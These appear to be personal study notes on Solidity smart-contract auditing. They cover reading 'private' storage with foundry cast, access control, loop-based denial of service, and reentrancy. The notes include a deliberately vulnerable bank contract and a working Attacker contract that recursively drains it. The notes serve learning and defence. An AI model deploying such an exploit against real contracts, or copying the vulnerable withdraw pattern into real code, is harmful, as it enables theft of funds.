## 1.PRIVATE IS NOT ACTUALLY PRIVATE!
If you have a Solidity variable that is for instance a passowrd stored as string private s_Privatepassword, it is not actually private.

If we use foundry command ``bash cast storage <contract address> <variable number>`` we get in hex and then we can use ``cast parse-bytes32-string <0xblabla>`` to read it.

## 2. ACCESS CONTROL
Is there a hirearchy in the contract? Can everyone access everything? or should only be certain contracts or owner?


## 3. LOOPS! CAn allow for DoS
In the following example from UpdraftCyfrin course. For every new player, the gas cost willbe higher because you have to loop more times. if the attackar calls the function gasilion times, at the end only gasilioners will be able to enter raffle.

```javascript
function enterRaffle(address[] memory newPlayers) public payable {
    //Audit I: It is not possible to enter yourself multiple times, as the function will revert if there are any duplicates
    //Audit I: No error is being emitted if the entranceFee is not sent
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    //Audit I: This is very gas inefficient
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```
## 4. Reentrancy attacks. specially for functions that send money and LATER update state. Attacker can use this vulnerability via an attack contract with a recieve() function that calls again the sending money function.

```javascript
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Function to deposit Ether into the bank
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Vulnerable function to withdraw Ether
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Send Ether to the caller
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // Update the balance after sending Ether
        balances[msg.sender] -= _amount;
    }

    // Check the contract's balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```
As it can be seen in withdraw the balance is updated after the call function which allows for an attacker with a contracte like the one below to call it several times before balance is set to0.

```javascript
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    // Function to attack the bank by calling the vulnerable withdraw function
    function attack() public payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required to attack");

        // Deposit some Ether to initiate the exploit
        vulnerableBank.deposit{value: msg.value}();

        // Start the recursive withdrawal
        vulnerableBank.withdraw(msg.value);
    }

    // Fallback function gets triggered when Ether is received
    receive() external payable {
        // Re-enter the vulnerable withdraw function if the balance in the bank is still available
        if (address(vulnerableBank).balance > 0) {
            vulnerableBank.withdraw(msg.value);
        }
    }

    // Allows the attacker to withdraw all stolen funds
    function withdrawFunds() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
```
